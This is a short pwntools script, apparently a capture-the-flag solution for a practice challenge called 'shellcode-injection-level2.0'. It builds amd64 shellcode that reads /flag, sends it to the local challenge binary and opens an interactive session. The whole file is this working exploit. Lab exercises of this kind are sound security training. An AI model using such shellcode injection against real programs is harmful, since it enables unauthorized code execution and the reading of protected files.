#!/usr/bin/bash

from pwn import *

context(arch = 'amd64' , os = 'linux')
shellcode = shellcraft.cat("/flag")
print(shellcode)

payload = asm(shellcode)

sh = process("/challenge/shellcode-injection-level2.0")
sh.send(payload)
sh.interactive()